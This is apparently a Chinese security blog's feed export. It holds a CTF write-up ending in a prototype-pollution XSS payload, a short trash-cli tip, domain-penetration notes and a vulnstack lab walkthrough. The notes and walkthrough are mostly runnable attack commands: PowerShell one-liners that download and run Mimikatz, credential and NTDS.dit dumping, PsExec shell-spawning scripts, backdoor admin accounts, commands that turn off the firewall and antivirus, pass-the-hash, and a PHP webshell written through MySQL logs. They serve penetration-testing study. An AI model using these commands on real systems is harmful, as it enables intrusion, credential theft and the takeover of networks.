$(&#39;.fa-battery-quarter&#39;).click(() =&gt; car.battery())    $(&#39;.fa-key&#39;).click(() =&gt; car.ignition())    $(&#39;.fa-wrench&#39;).click(() =&gt; car.repair())    $(&#39;.fa-step-forward&#39;).click(() =&gt; nextCar())    if(h.includes(&#39;Bugatti&#39;))        autoStart(bugatti)    if(h.includes(&#39;Porsche&#39;))        autoStart(porsche)})const nextCar = () =&gt; {    cars.push(cars.shift())    $(&quot;.image&quot;).attr(&#39;src&#39;, cars[0].pic);}const autoStart = (car) =&gt; {    car.repair()    car.ignition()    car.powerOn()}const repairWithHelper = (src) =&gt; {    /* who needs csp anyways !? */    urlRegx = /^\w{4,5}:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/;    if (urlRegx.test(src)) {        let s = document.createElement(&#39;script&#39;)        s.src = src        $(&#39;head&#39;).append(s)    }}const infobox = (text) =&gt; {    $(&#39;a&#39;).css({&#39;pointer-events&#39;: &#39;none&#39;, &#39;border&#39;: &#39;none&#39;})    $(&#39;.infobox&#39;).addClass(&#39;infoAnimate&#39;)        .text(text)        .on(&#39;animationend&#39;, function() {            $(this).removeClass(&#39;infoAnimate&#39;)            $(&#39;a&#39;).css({&#39;pointer-events&#39;: &#39;all&#39;, &#39;border&#39;: &#39;solid 1px rgba(255, 255, 255, .25)&#39;})    })}</code></pre><p>阅读代码发现car类的repair方法会调用</p><p><code>$.extend(true, this, JSON.parse(urlParams.get(&#39;repair&#39;)))</code></p><p>可以进行原型链污染</p><p>而这一题我们的目标时进行xss</p><p>阅读代码发现对象<code>porsche</code>的repairWithHelper中可以进行xss</p><p>而调用repairWithHelper方法就需要调用porsche的repair方法</p><pre><code>if($.md5(porsche) == &#39;9cdfb439c7876e703e307864c9167a15&#39;){        if(urlParams.has(&#39;help&#39;)) {            repairWithHelper(urlParams.get(&#39;help&#39;))        }}</code></pre><p>我们用控制porsche.toString()==’lol’(lol的md5是9cdfb439c7876e703e307864c9167a15)，我们可以通过原型链污染来让上层为<code>[&#39;lol&#39;]</code>([‘lol’].toString()==’lol’)</p><p>通过autoStart来调用bugatti.repair(原型链污染)和porsche.repair(调用repairWithHelper方法)</p><p>所以构造payload:<code>http://127.0.0.1/?repair={&quot;started&quot;:true,&quot;__proto__&quot;:{&quot;__proto__&quot;:[&quot;lol&quot;]}}</code></p><p>接下来就是利用repairWithHelper来进行xss</p><pre><code class="javascript">const repairWithHelper = (src) =&gt; {    /* who needs csp anyways !? */    urlRegx = /^\w{4,5}:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/;    if (urlRegx.test(src)) {        let s = document.createElement(&#39;script&#39;)        s.src = src        $(&#39;head&#39;).append(s)    }}</code></pre><p>虽然这里对url的域名进行了限制不能远程文件包含</p><p>但是我们可以利用data协议来绕过正则从而直接执行命令</p><p>data协议格式</p><pre><code>data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</code></pre><p>最后的payload:<code>http://127.0.0.1/?repair={&quot;key&quot;:&quot;🔑&quot;,&quot;__proto__&quot;:{&quot;__proto__&quot;:[&quot;lol&quot;]}}&amp;help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/asdfsdf/asdf,alert(&quot;123&quot;)%23.js#BugattiPorsche</code></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/02/18/js原型链污染/">https://www.ccreater.top/2020/02/18/js原型链污染/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>避免rm -rf *的悲惨命运</title>
      <link href="2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/"/>
      <url>2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/</url>
      
        <content type="html"><![CDATA[<h1 id="避免rm-rf-的悲惨命运"><a href="#避免rm-rf-的悲惨命运" class="headerlink" title="避免rm -rf *的悲惨命运"></a>避免rm -rf *的悲惨命运</h1><p>今天又是悲惨的一天,没认真看,rm -rf *错地方了</p><p>为了再次避免悲惨命运</p><ol><li><p>还是不要老是用root用户了,创个日常的低权限用户,有必要时再登陆root</p></li><li><p>别用rm 啦,改用trash吧</p></li></ol><h2 id="安装trash-cli"><a href="#安装trash-cli" class="headerlink" title="安装trash-cli"></a>安装trash-cli</h2><p><code>apt-get install trash-cli</code></p><p><code>echo alias rm=trash &gt;&gt; ~/.zshrc</code></p><p><code>source ~/.zshrc</code> </p><h2 id="trash-cli-命令"><a href="#trash-cli-命令" class="headerlink" title="trash-cli 命令"></a>trash-cli 命令</h2><table><thead><tr><th>command</th><th>explain</th></tr></thead><tbody><tr><td>trash-put/trash</td><td>将文件或目录放进回收站</td></tr><tr><td>trash-empty</td><td>清空回收站</td></tr><tr><td>trash-list</td><td>列出回收站中的文件</td></tr><tr><td>restore-trash</td><td>还原回收站中的文件</td></tr><tr><td>trash-rm</td><td>删除回收站中的单个文件</td></tr></tbody></table><h2 id="垃圾站所在位置"><a href="#垃圾站所在位置" class="headerlink" title="垃圾站所在位置"></a>垃圾站所在位置</h2><p><code>~/.local/share/Trash/files</code></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/02/17/避免rm-rf-的悲惨命运/">https://www.ccreater.top/2020/02/17/避免rm-rf-的悲惨命运/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域渗透</title>
      <link href="2020/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
      <url>2020/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="域渗透学习笔记"><a href="#域渗透学习笔记" class="headerlink" title="域渗透学习笔记"></a>域渗透学习笔记</h1><h2 id="名词-缩写"><a href="#名词-缩写" class="headerlink" title="名词/缩写"></a>名词/缩写</h2><p> 活动目录（Active Directory），AD：活动目录是WindowsServer在网络环境中提供的“资源目录”。活动目录是储存着域中相关资源信息的目录，例如计算机，用户组，数据库，服务器，打印机，用户属性（权限等），就像一个数据库。<br>域控（Domain Controller），DC：安装了AD的服务器就是域控制器，即有AD的计算机就是DC。 </p><h2 id="什么是域"><a href="#什么是域" class="headerlink" title="什么是域"></a>什么是域</h2><p> 将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。 </p><h2 id="域的特点"><a href="#域的特点" class="headerlink" title="域的特点"></a>域的特点</h2><p> 域成员计算机在登录的时候可以选择登录到域中或此计算机，登陆到域中的时候，身份验证是采用Kerberos协议在域控制器上进行的，登陆到此计算机则是通过SAM来进行NTLM验证的</p><p> 默认情况下，域用户可以登录到域中所有的工作站，不包括域控制器，管理员也可以指定具体的计算机，域用户信息保存在活动目录中</p><h2 id="一些其他关于域的知识"><a href="#一些其他关于域的知识" class="headerlink" title="一些其他关于域的知识"></a>一些其他关于域的知识</h2><h3 id="DNS定位域控制器"><a href="#DNS定位域控制器" class="headerlink" title="DNS定位域控制器"></a>DNS定位域控制器</h3><p>DNS负责将域名解析成IP地址</p><p>内网的DNS则可以定位DC，域会有名称，比如domaintest。域会向DNS注册这个名称，即SRV记录。域中的计算机访问SRV来进而访问DC。</p><p>通常DNS和DC会安装在同一计算机上，因而此计算的本地连接DNS要指向自身。</p><h2 id="域渗透思路"><a href="#域渗透思路" class="headerlink" title="域渗透思路"></a>域渗透思路</h2><p> 通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从<strong>域成员主机内存中</strong>dump出域管理员密码，进而拿下域控制器、渗透整个内网。 </p><h2 id="域渗透常用命令"><a href="#域渗透常用命令" class="headerlink" title="域渗透常用命令"></a>域渗透常用命令</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><pre><code>dsquery server #得到域控制器的IP</code></pre><p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527168524.jpg" alt="image886"></p><p><code>net group &quot;domain controllers&quot; /domain</code>: 得到域控制器主机名 </p><p> 注意通过该指令得到的机器名后面会多一个$符号</p><p><code>net group &quot;domain admins&quot; /domain</code>  : 查询域管理用户 </p><p><code>net user /domain</code>查看所有域用户</p><p><code>net config workstation</code> : 查询当前登陆域 </p><p><code>net accounts /domain</code>:  查询域密码策略 </p><p><code>wmic qfe</code> : 查看补丁信息 </p><p><code>wmic os</code>:  查看操作系统类型 </p><p><code>ipconfig /all</code>查询本机IP段，所在域等</p><p><code>tasklist /S ip /U domain\username /P /V</code>查看远程计算机进程列表</p><p> 有一个特殊用户叫做krbtgt，该用户是用于Kerberos身份验证的帐户，获得了该用户的hash，就可以伪造票据进行票据传递攻击了 </p><h4 id="批量查找-域管理员登陆过目标计算机"><a href="#批量查找-域管理员登陆过目标计算机" class="headerlink" title="批量查找 域管理员登陆过目标计算机"></a>批量查找 域管理员登陆过目标计算机</h4><pre><code class="bat">@echo offecho check ip addr config file...if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto endecho read and analysis file...for /F &quot;eol=#&quot; %%i in (ip.txt) do echo %%i &amp;(echo %%i &amp;tasklist /s %%i /u administrator /p mytest2010 /v) &gt;&gt;d:\result.txt:endexit</code></pre><h4 id="批量反弹cmdshell"><a href="#批量反弹cmdshell" class="headerlink" title="批量反弹cmdshell"></a>批量反弹cmdshell</h4><pre><code class="cmd">@echo offecho check ip addr config file...if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto endecho read and analysis file...for /F &quot;eol=#&quot; %%i in (ip.txt) do start PsExec.exe \\%%i -accepteula -u administrator -p &quot;123456&quot; cmd &amp; start cmd /c PsExec.exe \\%%i -u administrator -p &quot;123456&quot; cmd:endexit</code></pre><h3 id="访问内网其他主机"><a href="#访问内网其他主机" class="headerlink" title="访问内网其他主机"></a>访问内网其他主机</h3><p> net use建立Ipc$连接、wmic指令连接、采用rdp方式连接 , psexec进行远程连接 </p><p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527169390.jpg" alt="image2183"></p><p><code>net use \\ip\ipc$ pawword /user:username</code>建立IPC会话</p><h3 id="抓取内存中的hash-密码"><a href="#抓取内存中的hash-密码" class="headerlink" title="抓取内存中的hash/密码"></a>抓取内存中的hash/密码</h3><p>抓明文</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -DumpCerts</code></pre><h4 id="普通hash"><a href="#普通hash" class="headerlink" title="普通hash"></a>普通hash</h4><p>抓hash</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#39;);Get-PassHashes</code></pre><p>抓取明文:<code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</code></p><p>抓取hash:<code>mimikatz log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot; exit</code></p><p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:god.org /all /csv&quot; exit</code></p><h4 id="域hash"><a href="#域hash" class="headerlink" title="域hash"></a>域hash</h4><p>NTDS.dit获取域控hash</p><p>这个思路在域渗透中尤为重要，因为这里面包含着所有域用户的hash，当然该思路只对DC生效。</p><p>手动导出NTDS.dit和System-hive，本地或目标机导hash，因为，如果域足够大，该文件也会特别大。</p><p><code>ntdsutil &quot;ac i ntds&quot; ifm &quot;create full c:\users\tmp&quot; q q</code></p><p><code>NTDSDumpEx -d ntds.dit -s system -o domain.txt</code>:注意-d 为ntds.dit路径,-s为system(导出的)路径</p><p><img src="https://image.3001.net/images/20191022/1571757314_5daf1d0242611.png!small" alt="image3247"></p><pre><code>python secretsdump.py -system SYSTEM -ntds ntds.dit localpython secretsdump.py rabbitmask:1q2w3e4r!@192.168.15.181</code></pre><p><img src="https://image.3001.net/images/20191022/1571757406_5daf1d5ee8ee7.png!small" alt="image3460"></p><p><img src="https://image.3001.net/images/20191022/1571757426_5daf1d72d86f0.png!small" alt="image3545"></p><h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><pre><code>net user ccreater Abc1234 /addnet localgroup administrators ccreater /addREG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></pre><h3 id="域控提取域用户hash"><a href="#域控提取域用户hash" class="headerlink" title="域控提取域用户hash"></a>域控提取域用户hash</h3><h4 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h4><p> ntdsutil.exe是域控制器自带的域数据库管理工具，从windows 2008就默认自带了 </p><pre><code>Ntdsutil     snapshot—activate instance ntds    create    mount {guid}copy 装载点\windows\NTDS\ntds.dit d:\ntds_save.dit</code></pre><p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527169954.jpg" alt="image4044"></p><p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527170055.jpg" alt="image4122"></p><p> 最后执行 </p><pre><code>unmount {guid}delete {guid}quit</code></pre><p> 删除装载点即可，避免被发现 </p><p>接着上传工具QuarksPwDump到域控制器上，然后执行如下命令，成功提取用户hash</p><p><code>QuarksPwDump --dump-hash-domain --ntds-file d:\ntds_save.dit</code></p><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p><code>mimikatz log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot;</code></p><h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><pre><code>netsh advfirewall set allprofiles state off#关闭防火墙net stop windefendnetsh firewall set opmode mode=disablebcdedit.exe /set{current} nx AlwaysOff#关闭DEPmeterpreter &gt; run killav  关闭杀毒软件 </code></pre><h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><p> 域中每个用户的Ticket都是由krbtgt的密码Hash来计算生成的，因此只要我们拿到了krbtgt的密码Hash，就可以随意伪造Ticket，进而使用Ticket登陆域控制器，使用krbtgt用户hash生成的票据被称为Golden Ticket，此类攻击方法被称为票据传递攻击。 </p><h2 id="MS14-068-pth"><a href="#MS14-068-pth" class="headerlink" title="MS14-068/pth"></a>MS14-068/pth</h2><p> 微软给出的补丁是kb3011780，在server 2000以上的域控中，如果没有打这个补丁，那么情况将比较糟糕，利用该漏洞可以将任何一个域用户提权至域管理员权限，危害极大。 </p><h3 id="msf-psexec"><a href="#msf-psexec" class="headerlink" title="msf-psexec"></a>msf-psexec</h3><p>目标:192.168.52.138</p><pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8:::</code></pre><pre><code>use exploit/windows/smb/psexecset lhost xxxset lport xxxset rhosts 192.168.52.138set smbuser Administratorset smbpass aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8</code></pre><h3 id="impacket-smbexec"><a href="#impacket-smbexec" class="headerlink" title="impacket_smbexec"></a>impacket_smbexec</h3><pre><code>python smbexec.py -hash aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8Administrator@192.168.52.138orpython smbexec.py -hashes :a45a7246dd74b64a67f22fd7020f1bd8 Administrator@192.168.52.138</code></pre><p>显然，其实它只需要NThash部分就好啦。</p><h2 id="copy-于"><a href="#copy-于" class="headerlink" title="copy 于"></a>copy 于</h2><p> <a href="http://www.xmrseo.com/?post=87" target="_blank" rel="noopener">http://www.xmrseo.com/?post=87</a> </p><p> <a href="https://zhengbao.wang/域渗透基础/" target="_blank" rel="noopener">https://zhengbao.wang/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/</a> </p><p> <a href="https://www.freebuf.com/articles/system/217681.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/217681.html</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/02/17/域渗透/">https://www.ccreater.top/2020/02/17/域渗透/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnstackATT&amp;CK红队评估靶场1渗透记录</title>
      <link href="2020/02/17/vulnstackATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E9%9D%B6%E5%9C%BA1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/"/>
      <url>2020/02/17/vulnstackATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E9%9D%B6%E5%9C%BA1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnstackATT-amp-CK红队评估靶场1渗透记录"><a href="#vulnstackATT-amp-CK红队评估靶场1渗透记录" class="headerlink" title="vulnstackATT&amp;CK红队评估靶场1渗透记录"></a>vulnstackATT&amp;CK红队评估靶场1渗透记录</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>已知靶机在192.168.2.*上</p><pre><code>[*] Nmap: Nmap scan report for stu1.lan (192.168.2.142)[*] Nmap: Nmap scan report for kali.lan (192.168.2.158)</code></pre><p>目标就是192.168.2.142</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre><code>[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 10:48 CST[*] Nmap: Stats: 0:03:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan[*] Nmap: SYN Stealth Scan Timing: About 54.92% done; ETC: 10:54 (0:02:47 remaining)[*] Nmap: Stats: 0:03:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan[*] Nmap: SYN Stealth Scan Timing: About 54.97% done; ETC: 10:54 (0:02:47 remaining)[*] Nmap: Stats: 0:04:40 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan[*] Nmap: SYN Stealth Scan Timing: About 75.24% done; ETC: 10:54 (0:01:32 remaining)[*] Nmap: Nmap scan report for stu1.lan (192.168.2.142)[*] Nmap: Host is up (0.00062s latency).[*] Nmap: Not shown: 65523 closed ports[*] Nmap: PORT     STATE SERVICE[*] Nmap: 80/tcp   open  http[*] Nmap: 135/tcp  open  msrpc[*] Nmap: 139/tcp  open  netbios-ssn[*] Nmap: 445/tcp  open  microsoft-ds[*] Nmap: 1025/tcp open  NFS-or-IIS[*] Nmap: 1026/tcp open  LSA-or-nterm[*] Nmap: 1027/tcp open  IIS[*] Nmap: 1028/tcp open  unknown[*] Nmap: 1029/tcp open  ms-lsa[*] Nmap: 1030/tcp open  iad1[*] Nmap: 3306/tcp open  mysql[*] Nmap: 3389/tcp open  ms-wbt-server[*] Nmap: MAC Address: 00:0C:29:A7:C1:B2 (VMware)</code></pre><h2 id="web服务"><a href="#web服务" class="headerlink" title="web服务"></a>web服务</h2><p>先去看看web服务吧</p><pre><code>[10:52:41] 200 -   11B  - /index.php[10:52:45] 200 -   71KB - /phpinfo.php[10:52:45] 200 -    4KB - /phpMyAdmin/[10:52:53] 200 -    2B  - /1.php</code></pre><p>看了一下只有phpmyadmin有用</p><p>试着弱密码登陆,不直接用mysql客户端登陆是因为怕他们禁止远程ip</p><p>网上随便找了一个爆破phpmyadmin的</p><p><img src="https://i.loli.net/2020/02/16/vIQt8APEoGW7aKT.png" alt="image1782"></p><p>弱密码登陆成功</p><p>尝试sql写shell</p><pre><code>1. select &quot;test&quot; into outfile &quot;C:/phpStudy/WWW/test.php&quot;;2. 日志写shellmysql&gt; show variables like &#39;%general%&#39;#先看下当前mysql默认的日志位置在什么地方,&#39;C:\phpStudy\MySQL\data\stu1.log&#39; 顺手把原来正常的日志路径稍微记录下,等会儿干完活儿再把它恢复回来mysql&gt; set global general_log = on#默认基本都是关闭的,不然这个增删改查的记录量可能会非常大mysql&gt;  set global general_log_file = &#39;C:/phpStudy/WWW/test.php&#39;;#此时,再把原本的日志文件位置指向到目标网站的物理路径mysql&gt; select &#39;&lt;?php eval($_POST[request]);?&gt;&#39;#开始写shell,这里就是个普通的shell,不免杀,如果有waf的话,可以用下面的免杀shell##写完之后记得恢复mysql&gt; set global general_log_file = &#39;C:\phpStudy\MySQL\data\stu1.log&#39;;mysql&gt; set global general_log = off;</code></pre><p><img src="https://i.loli.net/2020/02/16/fUuoVKeY1BMhNXm.png" alt="image2457"></p><p>成功写入shell</p><p><img src="https://i.loli.net/2020/02/16/TKF1n7r5Am2cfBj.png" alt="image2535"></p><p>直接拿到管理员权限了</p><h2 id="meterpreter后攻击"><a href="#meterpreter后攻击" class="headerlink" title="meterpreter后攻击"></a>meterpreter后攻击</h2><pre><code>netsh advfirewall set allprofiles state off#关闭防火墙net stop windefendnetsh firewall set opmode mode=disablebcdedit.exe /set{current} nx AlwaysOff#关闭DEPmeterpreter &gt; run killav  关闭杀毒软件 </code></pre><h2 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h2><pre><code>msfvenom -p php/meterpreter/reverse_tcp -a php -f raw &gt; /tmp/2.phpuse exploit/multi/handlerset payload php/meterpreter/reverse_tcpshow optionsrun autoroute -s 192.168.52.143msf &gt; use auxiliary/server/socks4a   设置socks4代理模块msf auxiliary(socks4a) &gt; show options msf auxiliary(socks4a) &gt; runvim /etc/proxychains.conf   修改代理监听端口,和前面端口一致</code></pre><p>用msf设置的代理不知道为啥不太稳定</p><p>于是我用reGeorg来设置代理</p><p>emmmm,还是ew好用</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>因为socks无法代理icmp协议(ping使用的),所以namp要用<code>-Pn</code>选项</p><pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 13:50 ?D1��������?����??Nmap scan report for 192.168.52.138Host is up (0.00s latency).MAC Address: 00:0C:29:3F:5D:A9 (VMware)Nmap scan report for 192.168.52.141Host is up (0.00s latency).MAC Address: 00:0C:29:6D:39:34 (VMware)Nmap scan report for www.qiyuanxuetang.net (192.168.52.143)Host is up.Nmap done: 256 IP addresses (3 hosts up) scanned in 5.01 seconds</code></pre><p>接下来的目标是<code>192.168.52.138</code>,<code>192.168.52.141</code></p><p>192.168.52.138</p><pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 13:57 ?D1��������?����??Nmap scan report for 192.168.52.138Host is up (0.00031s latency).Not shown: 983 filtered portsPORT      STATE SERVICE53/tcp    open  domain80/tcp    open  http88/tcp    open  kerberos-sec135/tcp   open  msrpc139/tcp   open  netbios-ssn389/tcp   open  ldap445/tcp   open  microsoft-ds464/tcp   open  kpasswd5593/tcp   open  http-rpc-epmap636/tcp   open  ldapssl3268/tcp  open  globalcatLDAP3269/tcp  open  globalcatLDAPsslMAC Address: 00:0C:29:3F:5D:A9 (VMware)Nmap done: 1 IP address (1 host up) scanned in 5.04 seconds</code></pre><p>Running: Microsoft Windows 7|8|Vista|2008</p><p>192.168.52.141</p><pre><code>21/tcp   open  ftp135/tcp  open  msrpc139/tcp  open  netbios-ssn445/tcp  open  microsoft-ds777/tcp  open  multiling-http1025/tcp open  NFS-or-IIS1026/tcp open  LSA-or-nterm1030/tcp open  iad11031/tcp open  iad26002/tcp open  X11:27001/tcp open  afs3-callback7002/tcp open  afs3-prserver8099/tcp open  unknown</code></pre><p>Running: Microsoft Windows XP|2003</p><p>弱密码登陆ftp,发现啥也弄不了动不动500</p><p>因为操作系统比较旧,可以试试MS17-010,成功!</p><p>但是只有ms17_010_command才利用成功,只能一次一次set command来执行命令</p><p>后来找到<code>cmd/windows/powershell_bind_tcp</code></p><p>能直接返回一个powershell</p><p>添加用户</p><pre><code>net user ccreater Abc1234 /addnet localgroup administrators ccreater /addREG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></pre><h2 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h2><pre><code>net group &quot;domain controllers&quot; /domain 得到域控制器主机名:OWAwmic qfe 查询安装补丁http://support.microsoft.com/?kbid=976902  OWA     Update                    KB976902               GOD\Administrator  11/21/2010 net user /domain查询域所有用户-------------------------------------------------------------------------------Administrator            gqy                      Guest                    krbtgt                   ligang                   liukaifeng01   </code></pre><p>没有安装kb3011780,可以将任何一个域用户提权至域管理员权限</p><p>域控的ip是:<code>192.168.52.138</code></p><pre><code>Authentication Id : 0 ; 996 (00000000:000003e4)Domain : GOD / S-1-5-21-2952760202-1353902439-2381784089Session           : Service from 0User Name         : OWA$Domain            : GODLogon Server      : (null)Logon Time        : 2020/2/16 20:59:23SID               : S-1-5-20    msv :         [00000003] Primary     * Username : OWA$     * Domain   : GOD     * NTLM     : f8ddc71a57488df64708651271185969     * SHA1     : 93d8566dd8e60d8a6bf47d86fd8c1d47a82bacdf    tspkg :        wdigest :         * Username : OWA$     * Domain   : GOD     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65     kerberos :         * Username : owa$     * Domain   : GOD.ORG     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65     ssp :        credman :    Authentication Id : 0 ; 47752 (00000000:0000ba88)Session           : UndefinedLogonType from 0User Name         : (null)Domain            : (null)Logon Server      : (null)Logon Time        : 2020/2/16 20:59:18SID               :     msv :         [00000003] Primary     * Username : OWA$     * Domain   : GOD     * NTLM     : f8ddc71a57488df64708651271185969     * SHA1     : 93d8566dd8e60d8a6bf47d86fd8c1d47a82bacdf     * NTLM     : f8ddc71a57488df64708651271185969:93d8566dd8e60d8a6bf47d86fd8c1d47a82bacdf    tspkg :        wdigest :        kerberos :        ssp :        credman :    Authentication Id : 0 ; 995 (00000000:000003e3)Session           : Service from 0User Name         : IUSRDomain            : NT AUTHORITYLogon Server      : (null)Logon Time        : 2020/2/16 21:00:06SID               : S-1-5-17    msv :        tspkg :        wdigest :         * Username : (null)     * Domain   : (null)     * Password : (null)    kerberos :        ssp :        credman :    Authentication Id : 0 ; 997 (00000000:000003e5)Session           : Service from 0User Name         : LOCAL SERVICEDomain            : NT AUTHORITYLogon Server      : (null)Logon Time        : 2020/2/16 20:59:23SID               : S-1-5-19    msv :        tspkg :        wdigest :         * Username : (null)     * Domain   : (null)     * Password : (null)    kerberos :         * Username : (null)     * 